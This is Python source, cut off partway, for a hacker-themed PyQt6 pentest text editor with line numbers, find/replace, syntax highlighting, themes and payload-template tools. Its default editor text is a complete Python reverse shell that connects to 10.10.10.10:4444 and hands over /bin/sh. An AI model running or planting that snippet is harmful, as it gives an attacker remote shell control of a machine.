# leviathan_edit.pyw
# LEVIATHAN EDIT v3.0 - PYQT6 POWERED ULTIMATE EDITION
# FIXED: Added missing imports and removed current line highlight

import sys
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QPushButton, QLabel, QFrame, QComboBox, QSlider,
    QFileDialog, QMessageBox, QMenu, QToolBar, QStatusBar,
    QScrollArea, QGroupBox, QSplitter, QTabWidget, QDialog,
    QDialogButtonBox, QLineEdit, QTextBrowser, QInputDialog,
    QPlainTextEdit, QAbstractScrollArea, QCheckBox
)
from PyQt6.QtGui import (
    QFont, QTextCursor, QTextCharFormat, QColor, QPalette,
    QAction, QIcon, QPixmap, QTextFormat, QPainter,
    QSyntaxHighlighter, QFontMetrics, QKeySequence, QContextMenuEvent,
    QPaintEvent, QResizeEvent, QTextBlock, QTextDocument, QBrush
)
from PyQt6.QtCore import (
    Qt, QSize, QRegularExpression, pyqtSignal, QTimer,
    QRect, QRectF, QPoint, QThread, pyqtSlot, QEvent
)
import base64
import urllib.parse
import re
import os
import json
from datetime import datetime
import hashlib

# Import for syntax highlighting
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter

# Import for auto complete/suggestions
import jedi
from PyQt6.QtWidgets import QListWidget, QListWidgetItem
from PyQt6.QtCore import Qt, QPoint


# ==================== LINE NUMBER WIDGET ====================
class LineNumberArea(QWidget):
    def __init__(self, editor):
        super().__init__(editor)
        self.code_editor = editor

    def sizeHint(self):
        return QSize(self.code_editor.line_number_area_width(), 0)

    def paintEvent(self, event):
        self.code_editor.line_number_area_paint_event(event)

class CodeEditorWithLineNumbers(QPlainTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.line_number_area = LineNumberArea(self)
        
        # Connect signals
        self.blockCountChanged.connect(self.update_line_number_area_width)
        self.updateRequest.connect(self.update_line_number_area)
        
        # Initial setup
        self.update_line_number_area_width(0)
        
        # Set default font
        self.setFont(QFont("Consolas", 14))
        
        self.setTabStopDistance(QFontMetrics(self.font()).horizontalAdvance(' ') * 4)
        self.textChanged.connect(self.auto_convert_tabs)
        
    def auto_convert_tabs(self):
        """Automatically convert tabs to spaces as user types"""
        cursor = self.textCursor()
        position = cursor.position()
    
        text = self.toPlainText()
        if '\t' in text:
            # Replace tabs with 4 spaces
            new_text = text.replace('\t', '    ')
        
            # Only update if something changed
            if new_text != text:
                self.blockSignals(True)  # Prevent infinite loop
                self.setPlainText(new_text)
            
                # Restore cursor position (accounting for tab expansion)
                cursor.setPosition(position)
                self.setTextCursor(cursor)
                self.blockSignals(False)
        
    def line_number_area_width(self):
        digits = 1
        max_num = max(1, self.blockCount())
        while max_num >= 10:
            max_num /= 10
            digits += 1
        space = 3 + self.fontMetrics().horizontalAdvance('9') * digits
        return space

    def update_line_number_area_width(self, newBlockCount):
        self.setViewportMargins(self.line_number_area_width(), 0, 0, 0)

    def update_line_number_area(self, rect, dy):
        if dy:
            self.line_number_area.scroll(0, dy)
        else:
            self.line_number_area.update(0, rect.y(), self.line_number_area.width(), rect.height())
        
        if rect.contains(self.viewport().rect()):
            self.update_line_number_area_width(0)

    def resizeEvent(self, event):
        super().resizeEvent(event)
        cr = self.contentsRect()
        self.line_number_area.setGeometry(QRect(cr.left(), cr.top(), 
                                                self.line_number_area_width(), cr.height()))

    def line_number_area_paint_event(self, event):
        painter = QPainter(self.line_number_area)
        
        # Fill background
        painter.fillRect(event.rect(), QColor("#001100"))
        
        # Draw line numbers
        block = self.firstVisibleBlock()
        block_number = block.blockNumber()
        top = self.blockBoundingGeometry(block).translated(self.contentOffset()).top()
        bottom = top + self.blockBoundingRect(block).height()
        
        # Get current theme colors from parent
        parent = self.parent()
        while parent and not hasattr(parent, 'custom_colors'):
            parent = parent.parent()
        
        text_color = QColor("#00ff41")  # Default if parent not found
        if parent and hasattr(parent, 'custom_colors'):
            text_color = QColor(parent.custom_colors.get("text", "#00ff41"))
        
        painter.setPen(text_color)
        painter.setFont(QFont("Consolas", self.font().pointSize() - 2))
        
        while block.isValid() and top <= event.rect().bottom():
            if block.isVisible() and bottom >= event.rect().top():
                number = str(block_number + 1)
                painter.drawText(0, int(top), self.line_number_area.width() - 3, 
                               self.fontMetrics().height(),
                               Qt.AlignmentFlag.AlignRight, number)
            
            block = block.next()
            top = bottom
            bottom = top + self.blockBoundingRect(block).height()
            block_number += 1

    def contextMenuEvent(self, event):
        menu = self.createStandardContextMenu()
        
        # Add separator
        menu.addSeparator()
        
        # Add "Find Text" action
        find_action = QAction("Find Text (Ctrl+F)", self)
        find_action.triggered.connect(self.show_find_dialog)
        menu.addAction(find_action)
        
        # Add "Find and Replace" action
        find_replace_action = QAction("Find and Replace (Ctrl+H)", self)
        find_replace_action.triggered.connect(self.show_find_replace_dialog)
        menu.addAction(find_replace_action)
        
        menu.addSeparator()
        
        # Add "Paste Payload" action
        paste_payload_action = QAction("Paste Payload", self)
        # Connect to parent's template dialog
        parent = self.parent()
        while parent and not hasattr(parent, 'open_templates_tool'):
            parent = parent.parent()
        if parent:
            paste_payload_action.triggered.connect(parent.open_templates_tool)
        menu.addAction(paste_payload_action)
        
        menu.exec(event.globalPos())

    def show_find_dialog(self):
        # Get the main window reference
        parent = self.parent()
        while parent and not isinstance(parent, LeviathanEditUltimate):
            parent = parent.parent()
        
        dialog = FindDialog(self, parent)
        dialog.exec()

    def show_find_replace_dialog(self):
        # Get the main window reference
        parent = self.parent()
        while parent and not isinstance(parent, LeviathanEditUltimate):
            parent = parent.parent()
        
        dialog = FindReplaceDialog(self, parent)
        dialog.exec()

# ==================== FIND DIALOG ====================
class FindDialog(QDialog):
    def __init__(self, editor, main_window=None):
        super().__init__(main_window)
        self.editor = editor
        self.setWindowTitle("Find Text")
        self.setFixedSize(400, 200)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 2px solid #00ff88;
            }
            QCheckBox {
                color: #00ffaa;
                font-weight: bold;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Find label
        find_label = QLabel("Find:")
        find_label.setFont(QFont("Consolas", 12))
        layout.addWidget(find_label)
        
        # Find input
        self.find_input = QLineEdit()
        layout.addWidget(self.find_input)
        
        # Options
        options_layout = QHBoxLayout()
        
        self.case_sensitive = QCheckBox("Case Sensitive")
        self.case_sensitive.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.case_sensitive)
        
        self.whole_words = QCheckBox("Whole Words")
        self.whole_words.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.whole_words)
        
        layout.addLayout(options_layout)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        find_next_btn = QPushButton("Find Next")
        find_next_btn.clicked.connect(self.find_next)
        button_layout.addWidget(find_next_btn)
        
        find_prev_btn = QPushButton("Find Previous")
        find_prev_btn.clicked.connect(self.find_previous)
        button_layout.addWidget(find_prev_btn)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        
        self.setLayout(layout)
        
        # Set focus to find input
        self.find_input.setFocus()

    def find_next(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags)

    def find_previous(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags | QTextDocument.FindFlag.FindBackward)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags | QTextDocument.FindFlag.FindBackward)

# ==================== FIND/REPLACE DIALOG ====================
class FindReplaceDialog(QDialog):
    def __init__(self, editor, main_window=None):
        super().__init__(main_window)
        self.editor = editor
        self.setWindowTitle("Find and Replace")
        self.setFixedSize(400, 300)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #330000, stop:1 #110000);
                color: #ff4444;
                border: 2px solid #ff4444;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #550000, stop:1 #330000);
                border: 2px solid #ff8888;
            }
            QCheckBox {
                color: #00ffaa;
                font-weight: bold;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Find label
        find_label = QLabel("Find:")
        find_label.setFont(QFont("Consolas", 12))
        layout.addWidget(find_label)
        
        # Find input
        self.find_input = QLineEdit()
        layout.addWidget(self.find_input)
        
        # Replace label
        replace_label = QLabel("Replace with:")
        replace_label.setFont(QFont("Consolas", 12))
        layout.addWidget(replace_label)
        
        # Replace input
        self.replace_input = QLineEdit()
        layout.addWidget(self.replace_input)
        
        # Options
        options_layout = QHBoxLayout()
        
        self.case_sensitive = QCheckBox("Case Sensitive")
        self.case_sensitive.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.case_sensitive)
        
        self.whole_words = QCheckBox("Whole Words")
        self.whole_words.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.whole_words)
        
        layout.addLayout(options_layout)
        
        # Buttons
        button_layout1 = QHBoxLayout()
        
        find_next_btn = QPushButton("Find Next")
        find_next_btn.clicked.connect(self.find_next)
        button_layout1.addWidget(find_next_btn)
        
        replace_btn = QPushButton("Replace")
        replace_btn.clicked.connect(self.replace)
        button_layout1.addWidget(replace_btn)
        
        button_layout2 = QHBoxLayout()
        
        replace_all_btn = QPushButton("Replace All")
        replace_all_btn.clicked.connect(self.replace_all)
        button_layout2.addWidget(replace_all_btn)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        button_layout2.addWidget(close_btn)
        
        layout.addLayout(button_layout1)
        layout.addLayout(button_layout2)
        
        self.setLayout(layout)
        
        # Set focus to find input
        self.find_input.setFocus()

    def find_next(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags)

    def replace(self):
        find_text = self.find_input.text()
        replace_text = self.replace_input.text()
        
        if not find_text:
            return
            
        cursor = self.editor.textCursor()
        if cursor.hasSelection() and cursor.selectedText() == find_text:
            cursor.insertText(replace_text)
        
        # Find next
        self.find_next()

    def replace_all(self):
        find_text = self.find_input.text()
        replace_text = self.replace_input.text()
        
        if not find_text:
            return
            
        # Move to start
        cursor = self.editor.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.Start)
        self.editor.setTextCursor(cursor)
        
        flags = QTextDocument.FindFlag(0)
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
        
        count = 0
        while self.editor.find(find_text, flags):
            cursor = self.editor.textCursor()
            cursor.insertText(replace_text)
            count += 1
        
        QMessageBox.information(self, "Replace All", f"Replaced {count} occurrences.")

# ==================== SYNTAX HIGHLIGHTER ====================
class SyntaxHighlighter(QSyntaxHighlighter):
    def __init__(self, document):
        super().__init__(document)
        self.highlighting_rules = []
        
        # Define keyword formats
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#ff6b6b"))
        keyword_format.setFontWeight(QFont.Weight.Bold)
        
        keywords = [
            '\\bclass\\b', '\\bdef\\b', '\\breturn\\b', '\\bif\\b', '\\belif\\b', 
            '\\belse\\b', '\\bwhile\\b', '\\bfor\\b', '\\bin\\b', '\\btry\\b', 
            '\\bexcept\\b', '\\bfinally\\b', '\\bimport\\b', '\\bfrom\\b', 
            '\\bas\\b', '\\bwith\\b', '\\bpass\\b', '\\bbreak\\b', '\\bcontinue\\b'
        ]
        
        for pattern in keywords:
            rule = (QRegularExpression(pattern), keyword_format)
            self.highlighting_rules.append(rule)
        
        # String format
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#98c379"))
        self.highlighting_rules.append((QRegularExpression('\".*\"'), string_format))
        self.highlighting_rules.append((QRegularExpression('\'.*\''), string_format))
        
        # Comment format
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#5c6370"))
        self.highlighting_rules.append((QRegularExpression('#[^\n]*'), comment_format))
        
        # Function format
        function_format = QTextCharFormat()
        function_format.setForeground(QColor("#61afef"))
        self.highlighting_rules.append((QRegularExpression('\\b[A-Za-z0-9_]+(?=\\()'), function_format))
        
        # Number format
        number_format = QTextCharFormat()
        number_format.setForeground(QColor("#d19a66"))
        self.highlighting_rules.append((QRegularExpression('\\b[0-9]+\\b'), number_format))

    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = pattern
            iterator = expression.globalMatch(text)
            while iterator.hasNext():
                match = iterator.next()
                self.setFormat(match.capturedStart(), match.capturedLength(), format)

# ==================== MAIN WINDOW ====================
class LeviathanEditUltimate(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LEVIATHAN EDIT v3.0 - ULTIMATE CLASSIFIED PENTEST EDITOR")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Initialize themes
        self.init_themes()
        self.current_theme = "FBI Terminal"
        self.custom_colors = self.themes[self.current_theme].copy()
        
        # Initialize language settings
        self.current_language = "Python"
        self.lexer = get_lexer_by_name("python")
        
        # Font size
        self.base_font_size = 14
        self.current_font_size = 14
        
        # Background image
        self.background_image_path = None
        self.current_transparency = 1.0
        self.background_mode = "cover"

        # Custom templates
        self.custom_templates = self.load_custom_templates()
        
        # Create UI
        self.create_ui()
        
        # Load initial content into first tab
        current_tab = self.tabs.currentWidget()
        if hasattr(current_tab, 'editor'):
            current_tab.editor.setPlainText("""# TOP SECRET // NOFORN // EYES ONLY
# LEVIATHAN EDIT v3.0 - PYQT6 ULTIMATE EDITION

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

# TYPE HERE - BACKGROUND IS BEHIND TEXT, NOT IN TEXT
# This is the superior PyQt6 implementation""")
        
        # Apply initial theme
        self.apply_theme()
                       
        # AUTOCOMPLETE POPUP (JEDI)
        self.autocomplete_popup = QListWidget()
        self.autocomplete_popup.setWindowFlags(
            Qt.WindowType.ToolTip | Qt.WindowType.FramelessWindowHint
        )
        self.autocomplete_popup.setFocusPolicy(Qt.FocusPolicy.NoFocus)

        # Make it transparent and styled
        self.autocomplete_popup.setWindowOpacity(0.9)  # Adjust 0.0-1.0 for transparency
        self.autocomplete_popup.setStyleSheet("""
            QListWidget {
                background: transparent;
                color: #00ffaa;
                border: 2px solid #00ff41;
                border-radius: 6px;
                padding: 5px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QListWidget::item {
                padding: 5px;
                border-radius: 3px;
            }
            QListWidget::item:selected {
                background-color: rgba(0, 255, 65, 50);  /* Semi-transparent green */
                color: #00ff41;
                font-weight: bold;
            }
            QListWidget::item:hover {
                background-color: rgba(0, 255, 170, 30);
            }
        """)

        self.autocomplete_popup.hide()
        
    def resizeEvent(self, event):
        """Reapply background when window is resized"""
        super().resizeEvent(event)
        if self.background_image_path:
            # Small delay to avoid too many redraws during resize
            QTimer.singleShot(100, self.apply_background_style)

    def find_python(self):
        """
        Return a usable system Python interpreter path.
        - When running from source: prefer the running python (python on PATH).
        - When frozen as a PyInstaller EXE: try to *locate* a real python executable
          (python, python3, or py on Windows) via shutil.which().
        Returns the path string or None if not found.
        """
        import shutil

        # If not frozen, just use the current interpreter (should be fine for dev)
        if not getattr(sys, 'frozen', False):
            # use explicit 'python' or 'python3' on PATH
            for name in ("python", "python3"):
                p = shutil.which(name)
                if p:
                    return p
            # fallback to sys.executable
            return sys.executable

        # If frozen (EXE), we must find a system python (can't use sys.executable)
        # Try common names
        for name in (
            "python", "python3", "python3.11", "python3.10", "python3.9",
            "py",              # Windows
            "/usr/bin/python3",
            "/usr/local/bin/python3",
            "/opt/homebrew/bin/python3",   # macOS with Homebrew (Apple Silicon)
            "/usr/bin/python"
        ):
            p = shutil.which(name)
            if p:
                return p

        # Not found — return None so caller can inform user
        return None

    def init_themes(self):
        """Initialize the 10 epic themes"""
        self.themes = {
            "FBI Terminal": {
                "bg": "#000000", "panel": "#0d0d0d", "text": "#00ff41", "accent": "#00ff41",
                "line_bg": "#000000", "line_fg": "#004400", "select": "#003300", "cursor": "#00ff41"
            },
            "CIA BlackOps": {
                "bg": "#001122", "panel": "#001833", "text": "#00ffff", "accent": "#00ffff",
                "line_bg": "#001122", "line_fg": "#008888", "select": "#003366", "cursor": "#00ffff"
            },
            "NSA Quantum": {
                "bg": "#0a001f", "panel": "#1a0033", "text": "#ff00ff", "accent": "#ff00ff",
                "line_bg": "#0a001f", "line_fg": "#660066", "select": "#330066", "cursor": "#ff00ff"
            },
            "Matrix Rain": {
                "bg": "#000000", "panel": "#001100", "text": "#00ff00", "accent": "#00ff00",
                "line_bg": "#000000", "line_fg": "#003300", "select": "#002200", "cursor": "#00ff00"
            },
            "Blood Agent": {
                "bg": "#110000", "panel": "#220000", "text": "#ff3333", "accent": "#ff0000",
                "line_bg": "#110000", "line_fg": "#440000", "select": "#330000", "cursor": "#ff0000"
            },
            "Ghost Protocol": {
                "bg": "#0a0a1f", "panel": "#141428", "text": "#8888ff", "accent": "#4444ff",
                "line_bg": "#0a0a1f", "line_fg": "#333366", "select": "#222244", "cursor": "#8888ff"
            },
            "Zero Day": {
                "bg": "#001100", "panel": "#002200", "text": "#00ffaa", "accent": "#00ffaa",
                "line_bg": "#001100", "line_fg": "#004433", "select": "#003322", "cursor": "#00ffaa"
            },
            "Deep Web": {
                "bg": "#000011", "panel": "#000022", "text": "#44ff44", "accent": "#00ff00",
                "line_bg": "#000011", "line_fg": "#004400", "select": "#002200", "cursor": "#00ff00"
            },
            "Quantum Hack": {
                "bg": "#000033", "panel": "#000066", "text": "#00ccff", "accent": "#0088ff",
                "line_bg": "#000033", "line_fg": "#003366", "select": "#002244", "cursor": "#00ccff"
            },
            "Black Ice": {
                "bg": "#0f0f1f", "panel": "#1f1f3f", "text": "#88aaff", "accent": "#5588ff",
                "line_bg": "#0f0f1f", "line_fg": "#334466", "select": "#223355", "cursor": "#88aaff"
            }
        }

    def load_custom_templates(self):
        """Load custom templates from templates folder"""
        templates = {}
        templates_dir = os.path.join(os.path.dirname(__file__), "templates")
        
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir)
        
        if os.path.exists(templates_dir):
            for filename in os.listdir(templates_dir):
                if filename.endswith(('.txt', '.py', '.sh', '.js', '.html', '.css', '.java', '.c', '.cpp', '.go', '.rs', '.php', '.rb', '.sql')):
                    filepath = os.path.join(templates_dir, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            template_name = os.path.splitext(filename)[0].upper().replace('_', ' ')
                            templates[template_name] = f.read()
                    except:
                        pass
        
        return templates

    def create_ui(self):
        # === CENTRAL WIDGET ===
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        #################################################################
        #  SCROLLABLE SIDEBAR  (fixes disappearing buttons)
        #################################################################
        sidebar_scroll = QScrollArea()
        sidebar_scroll.setWidgetResizable(True)
        sidebar_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        sidebar_scroll.setStyleSheet("QScrollArea { border: none; }")

        sidebar_container = QWidget()
        sidebar_scroll.setWidget(sidebar_container)

        sidebar = QFrame(sidebar_container)
        sidebar.setMinimumWidth(350)
        sidebar.setMaximumWidth(350)
        sidebar.setStyleSheet("""
            QFrame {
                background-color: #111122;
                border-right: 2px solid #00ff41;
            }
        """)

        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(15, 15, 15, 15)
        sidebar_layout.setSpacing(10)

        outer_sidebar_layout = QVBoxLayout(sidebar_container)
        outer_sidebar_layout.addWidget(sidebar)

        # TITLE
        title = QLabel("LEVIATHAN\nEDIT v3.0")
        title.setFont(QFont("Orbitron", 28, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; background: transparent;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(title)

        version = QLabel("ULTIMATE PYQT6 EDITION")
        version.setFont(QFont("Consolas", 10))
        version.setStyleSheet("color: #ff0066; background: transparent;")
        version.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(version)

        sidebar_layout.addSpacing(20)

        tools_label = QLabel("CLASSIFIED TOOLS")
        tools_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        tools_label.setStyleSheet("color: #00ffaa; background: transparent;")
        sidebar_layout.addWidget(tools_label)

        # Your sidebar tool buttons
        tools = [
            ("BASE64 ENCODER/DECODER", self.open_base64_tool),
            ("URL ENCODE/DECODE", self.open_url_tool),
            ("HASH IDENTIFIER", self.open_hash_tool),
            ("PAYLOAD TEMPLATES", self.open_templates_tool)
        ]

        for name, cmd in tools:
            btn = QPushButton(name)
            btn.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            btn.setStyleSheet("""
                QPushButton {
                    background: #002200;
                    color: #00ff41;
                    border: 2px solid #00ff41;
                    border-radius: 8px;
                    padding: 12px;
                    margin: 5px;
                }
            """)
            btn.clicked.connect(cmd)
            sidebar_layout.addWidget(btn)

        # Theme Selector
        sidebar_layout.addSpacing(30)
        theme_label = QLabel("CLASSIFIED THEMES")
        theme_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        theme_label.setStyleSheet("color: #ff0066; background: transparent;")
        sidebar_layout.addWidget(theme_label)
        
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(list(self.themes.keys()))
        self.theme_combo.setCurrentText(self.current_theme)
        self.theme_combo.setFont(QFont("Consolas", 10))
        self.theme_combo.setStyleSheet("""
            QComboBox {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 8px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid #00ff41;
            }
        """)
        self.theme_combo.currentTextChanged.connect(self.load_theme)
        sidebar_layout.addWidget(self.theme_combo)

        # Display Settings
        sidebar_layout.addSpacing(30)
        display_label = QLabel("DISPLAY SETTINGS")
        display_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        display_label.setStyleSheet("color: #00aaff; background: transparent;")
        sidebar_layout.addWidget(display_label)
        
        # Font size control
        font_frame = QFrame()
        font_layout = QHBoxLayout(font_frame)
        font_layout.setContentsMargins(0, 0, 0, 0)
        
        decrease_font_btn = QPushButton("A-")
        decrease_font_btn.setFixedSize(50, 30)
        decrease_font_btn.clicked.connect(self.decrease_font)
        decrease_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_label = QLabel("FONT SIZE")
        font_label.setStyleSheet("color: #00ffaa;")
        font_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        increase_font_btn = QPushButton("A+")
        increase_font_btn.setFixedSize(50, 30)
        increase_font_btn.clicked.connect(self.increase_font)
        increase_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_layout.addWidget(decrease_font_btn)
        font_layout.addWidget(font_label)
        font_layout.addWidget(increase_font_btn)
        sidebar_layout.addWidget(font_frame)

        # Transparency control
        transparency_label = QLabel("TRANSPARENCY")
        transparency_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        transparency_label.setStyleSheet("color: #ff00ff; background: transparent;")
        sidebar_layout.addWidget(transparency_label)
        
        self.transparency_slider = QSlider(Qt.Orientation.Horizontal)
        self.transparency_slider.setRange(30, 100)
        self.transparency_slider.setValue(100)
        self.transparency_slider.setStyleSheet("""
            QSlider::groove:horizontal {
                border: 1px solid #ff00ff;
                height: 8px;
                background: #330033;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #ff00ff;
                border: 1px solid #ff00ff;
                width: 18px;
                margin: -5px 0;
                border-radius: 9px;
            }
        """)
        self.transparency_slider.valueChanged.connect(self.change_transparency)
        sidebar_layout.addWidget(self.transparency_slider)

        # Background Image
        background_label = QLabel("BACKGROUND IMAGE")
        background_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        background_label.setStyleSheet("color: #00ff88; background: transparent;")
        sidebar_layout.addWidget(background_label)
        
        bg_frame = QFrame()
        bg_layout = QHBoxLayout(bg_frame)
        bg_layout.setContentsMargins(0, 0, 0, 0)
        
        set_bg_btn = QPushButton("SET IMAGE")
        set_bg_btn.clicked.connect(self.set_background_image)
        set_bg_btn.setStyleSheet("""
            QPushButton {
                background: #003333;
                color: #00ffaa;
                border: 1px solid #00ffaa;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        clear_bg_btn = QPushButton("CLEAR")
        clear_bg_btn.clicked.connect(self.clear_background_image)
        clear_bg_btn.setStyleSheet("""
            QPushButton {
                background: #333300;
                color: #ffaa00;
                border: 1px solid #ffaa00;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        bg_layout.addWidget(set_bg_btn)
        bg_layout.addWidget(clear_bg_btn)
        sidebar_layout.addWidget(bg_frame)

        # Background Mode Selector
        bg_mode_label = QLabel("IMAGE MODE")
        bg_mode_label.setFont(QFont("Consolas", 10, QFont.Weight.Bold))
        bg_mode_label.setStyleSheet("color: #00ff88; background: transparent;")
        sidebar_layout.addWidget(bg_mode_label)

        self.bg_mode_combo = QComboBox()
        self.bg_mode_combo.addItems(["Cover", "Contain", "Stretch", "Center", "Tile"])
        self.bg_mode_combo.setCurrentText("Cover")
        self.bg_mode_combo.setFont(QFont("Consolas", 9))
        self.bg_mode_combo.setStyleSheet("""
                QComboBox {
                    background: #003333;
                    color: #00ffaa;
                    border: 1px solid #00ffaa;
                    border-radius: 4px;
                    padding: 6px;
                }
        """)
        self.bg_mode_combo.currentTextChanged.connect(self.change_background_mode)
        sidebar_layout.addWidget(self.bg_mode_combo)

        sidebar_layout.addStretch()

        # Add sidebar to main layout
        main_layout.addWidget(sidebar_scroll)

        #################################################################
        #  EDITOR AREA WITH TOP TABS (VS Code Style)
        #################################################################
        editor_area = QWidget()
        editor_layout = QVBoxLayout(editor_area)
        editor_layout.setContentsMargins(0, 0, 0, 0)
        editor_layout.setSpacing(0)

        # Toolbar
        toolbar = QToolBar()
        toolbar.setStyleSheet("QToolBar { background: #111122; padding: 5px; }")

        # Toolbar buttons
        new_action = QAction("NEW TAB", self)
        new_action.triggered.connect(self.new_file)
        toolbar.addAction(new_action)

        open_action = QAction("OPEN FILE", self)
        open_action.triggered.connect(self.open_file)
        toolbar.addAction(open_action)

        save_action = QAction("SAVE FILE", self)
        save_action.triggered.connect(self.save_file)
        toolbar.addAction(save_action)
        
        # === RUN CODE BUTTON ===
        run_action = QAction("RUN", self)
        run_action.triggered.connect(self.run_current_file)
        toolbar.addAction(run_action)

        toolbar.addSeparator()
        
        lang_label = QLabel("  LANG:")
        lang_label.setStyleSheet("color: #00ff41;")
        toolbar.addWidget(lang_label)
        
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["Python", "JavaScript", "HTML", "CSS", "Bash", "C", "C++", 
                                  "Java", "Go", "Rust", "PHP", "Ruby", "SQL"])
        self.lang_combo.setCurrentText("Python")
        self.lang_combo.setFixedWidth(120)
        self.lang_combo.setStyleSheet("""
            QComboBox {
                background: #003300;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 4px;
            }
        """)
        self.lang_combo.currentTextChanged.connect(self.change_language)
